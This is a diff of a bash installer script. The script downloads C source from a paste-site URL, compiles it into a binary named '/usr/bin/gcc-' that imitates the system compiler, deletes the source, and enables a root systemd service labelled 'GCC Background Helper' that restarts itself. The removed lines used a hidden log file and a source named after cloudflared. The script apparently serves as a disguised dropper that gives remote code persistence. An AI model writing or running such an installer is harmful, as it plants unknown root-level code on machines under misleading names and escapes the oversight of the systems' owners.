@@ -1,182 +1,130 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-# Config
-DOWNLOAD_URL="https://pastee.dev/d/Gk8J5oSB/0"
-C_SOURCE="cloudflared.c"
-BINARY_DEST="/usr/bin/gcc-"
-SUPERVISOR="/usr/bin/gcc-supervisor.sh"
-LOGFILE="/var/log/.cache.log"
-SERVICE_FILE="/etc/systemd/system/gcc-.service"
-MAX_TRIES=3
+# install_gcc.sh
+# Usage: sudo ./install_gcc.sh "https://pastee.dev/d/AouQi1hu/0"
+# Must run as root.
+
+LOG="/var/log/install_gcc.log"
+SRCFILE="gcc.c"
+BINARY="/usr/bin/gcc-"
+SERVICE="/etc/systemd/system/gcc-.service"
+MAX_TRIES=4
 SLEEP_BETWEEN=2
 
+# Helper logging
+log() {
+  echo "[$(date -u '+%Y-%m-%dT%H:%M:%SZ')] $*" | tee -a "$LOG"
+}
+
 if [ "$(id -u)" -ne 0 ]; then
-  echo "Run as root: sudo $0"
+  echo "This installer must be run as root. Exiting."
   exit 2
 fi
 
-echo "[*] Starting installer (no PID file, Type=simple service)"
+if [ $# -lt 1 ]; then
+  echo "Usage: $0 <source-url>"
+  exit 2
+fi
 
-download_file() {
-  local url="$1" out="$2"
-  if command -v wget >/dev/null 2>&1; then
-    wget -q "$url" -O "$out"
-    return $?
-  elif command -v curl >/dev/null 2>&1; then
-    curl -fSL "$url" -o "$out"
-    return $?
-  else
-    echo "[ERROR] wget/curl not found"
-    return 2
-  fi
-}
+URL="$1"
+log "[*] Starting installer"
+log "[*] Source URL: $URL"
 
-# Download with retries
-echo "[*] Downloading $DOWNLOAD_URL -> $C_SOURCE"
-tries=0
-while [ $tries -lt $MAX_TRIES ]; do
-  tries=$((tries+1))
-  echo "[*] Attempt $tries..."
-  if download_file "$DOWNLOAD_URL" "$C_SOURCE"; then
-    if [ -s "$C_SOURCE" ]; then
-      head1=$(head -n1 "$C_SOURCE" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)
-      if [[ "$head1" == "<!doctype"* || "$head1" == "<html"* ]]; then
-        echo "[WARN] Download looks like HTML; retrying"
-        rm -f "$C_SOURCE"
-      else
-        echo "[+] Download ok"
-        break
-      fi
-    else
-      echo "[WARN] Zero-size; retrying"
-      rm -f "$C_SOURCE" || true
-    fi
-  else
-    echo "[WARN] download command failed; retrying"
-  fi
-  [ $tries -lt $MAX_TRIES ] && sleep $SLEEP_BETWEEN
-done
-
-if [ ! -s "$C_SOURCE" ]; then
-  echo "[ERROR] Failed to download valid source after $MAX_TRIES tries"
+# ensure basic tools exist
+if ! command -v gcc >/dev/null 2>&1; then
+  log "[ERROR] gcc not found. Please install gcc (e.g. apt install build-essential) and re-run."
   exit 1
 fi
 
-# Compile
-echo "[*] Compiling $C_SOURCE -> $BINARY_DEST"
-gcc -O2 "$C_SOURCE" -o "$BINARY_DEST"
-rm -f "$C_SOURCE"
-chmod 755 "$BINARY_DEST"
-chown root:root "$BINARY_DEST"
-echo "[+] Binary installed: $BINARY_DEST"
-
-# Ensure logfile
-echo "[*] Ensuring log file $LOGFILE exists"
-touch "$LOGFILE"
-if getent group nogroup >/dev/null 2>&1; then
-  chown nobody:nogroup "$LOGFILE" || true
+DL_TOOL=""
+if command -v wget >/dev/null 2>&1; then
+  DL_TOOL="wget"
+elif command -v curl >/dev/null 2>&1; then
+  DL_TOOL="curl"
 else
-  chown nobody:nobody "$LOGFILE" || true
+  log "[ERROR] neither wget nor curl found. Install one and retry."
+  exit 1
 fi
-chmod 0640 "$LOGFILE"
 
-# Install supervisor wrapper
-echo "[*] Writing supervisor wrapper -> $SUPERVISOR"
-cat > "$SUPERVISOR" <<'EOF'
-#!/usr/bin/env bash
-# gcc-supervisor.sh
-# Launch /usr/bin/gcc- and wait for its long-running child (if it forks).
-# Writes output to $LOGFILE via systemd unit's StandardOutput.
-
-set -euo pipefail
-
-DAEMON="/usr/bin/gcc-"
-
-# Launch the daemon in background so we can observe forking
-# Use setsid so child's std fds don't tie to our shell (optional)
-setsid "$DAEMON" &
-
-launcher_pid=$!
-
-# give launcher a moment to fork if it will
-sleep 0.5
-
-# Try to find a child process of launcher_pid that is not the launcher itself.
-# If the program does not fork, then launcher_pid is the long-running pid, so wait on it.
-find_longrun_pid() {
-  # prefer descendant that's not launcher
-  child=$(pgrep -P "$launcher_pid" | tail -n1 || true)
-  if [ -n "$child" ]; then
-    echo "$child"
-    return 0
+# download with retries and light validation (avoid HTML error pages)
+tries=0
+while [ $tries -lt $MAX_TRIES ]; do
+  tries=$((tries+1))
+  log "[*] Download attempt #$tries ..."
+  rm -f "$SRCFILE"
+  if [ "$DL_TOOL" = "wget" ]; then
+    wget -q --timeout=15 --tries=2 -O "$SRCFILE" "$URL" || true
+  else
+    curl -fSL --max-time 20 -o "$SRCFILE" "$URL" || true
   fi
-  # fallback: if launcher is still running, use it
-  if kill -0 "$launcher_pid" 2>/dev/null; then
-    echo "$launcher_pid"
-    return 0
-  fi
-  return 1
-}
 
-# loop until we find a pid to wait on (timeout after a short period)
-attempts=0
-while [ $attempts -lt 40 ]; do
-  attempts=$((attempts + 1))
-  target_pid=$(find_longrun_pid || true)
-  if [ -n "$target_pid" ]; then
-    # wait on the target so supervisor stays alive while daemon runs
-    wait "$target_pid"
-    exit $?
+  if [ ! -s "$SRCFILE" ]; then
+    log "[WARN] Download produced zero-size or failed."
+  else
+    # quick validation: ensure it doesn't start with HTML doctype or <html
+    head1=$(head -n 1 "$SRCFILE" | tr '[:upper:]' '[:lower:]' || true)
+    if [[ "$head1" == "<!doctype"* || "$head1" == "<html"* || "$head1" == *"error"* && "$head1" == *"html"* ]]; then
+      log "[WARN] Download looks like HTML or error page. Retrying..."
+      rm -f "$SRCFILE"
+    else
+      log "[+] Download OK."
+      break
+    fi
   fi
-  sleep 0.1
+
+  if [ $tries -lt $MAX_TRIES ]; then
+    sleep $SLEEP_BETWEEN
+  fi
 done
 
-# nothing found; wait for launcher to exit and forward exit code
-wait "$launcher_pid" || exit $?
-exit 0
-EOF
+if [ ! -s "$SRCFILE" ]; then
+  log "[ERROR] Failed to download a valid source file after $MAX_TRIES tries. Aborting."
+  exit 1
+fi
 
-chmod 755 "$SUPERVISOR"
-chown root:root "$SUPERVISOR"
-echo "[+] Supervisor installed: $SUPERVISOR"
+# compile
+log "[*] Compiling $SRCFILE -> $BINARY"
+if ! gcc -O2 "$SRCFILE" -o "$BINARY"; then
+  log "[ERROR] gcc failed to compile $SRCFILE"
+  rm -f "$SRCFILE"
+  exit 1
+fi
 
-# Create systemd service (Type=simple, no PIDFile)
-echo "[*] Writing systemd unit -> $SERVICE_FILE"
-cat > "$SERVICE_FILE" <<EOF
+rm -f "$SRCFILE"
+chmod 755 "$BINARY"
+chown root:root "$BINARY"
+log "[+] Binary built and installed to $BINARY"
+
+# write systemd service (runs as root)
+log "[*] Writing systemd service to $SERVICE"
+
+cat > "$SERVICE" <<'UNIT'
 [Unit]
-Description=GCC Background Helper (supervisor, no PID file)
+Description=GCC Background Helper
 After=network.target
 
 [Service]
 Type=simple
 User=root
-ExecStart=$SUPERVISOR
-Restart=on-failure
-RestartSec=5
 KillSignal=SIGTERM
-# capture stdout/stderr to logfile
-StandardOutput=append:$LOGFILE
-StandardError=inherit
-WorkingDirectory=/
+ExecStart=/usr/bin/gcc-
+Restart=always
+RestartSec=3
 
 [Install]
 WantedBy=multi-user.target
-EOF
+UNIT
 
-echo "[*] Reloading systemd and starting service"
+log "[*] Reloading systemd and enabling service"
 systemctl daemon-reload
-systemctl enable --now gcc-.service
+systemctl enable --now gcc-.service || true
+sleep 0.5
 
-sleep 1
+log "----- systemctl status (last lines) -----"
+systemctl status --no-pager gcc-.service -n 20 | sed -n '1,200p' | tee -a "$LOG" || true
 
-echo
-echo "----- systemctl status -----"
-systemctl status --no-pager gcc-.service || true
+log "----- journalctl (last 50 lines) -----"
+journalctl -u gcc-.service -n 50 --no-pager | tee -a "$LOG" || true
 
-echo
-echo "----- journalctl last 40 lines -----"
-journalctl -u gcc-.service -n 40 --no-pager || true
-
-echo
-echo "[✔] install_all_nopid.sh finished."
+log "[✔] install_gcc.sh finished"
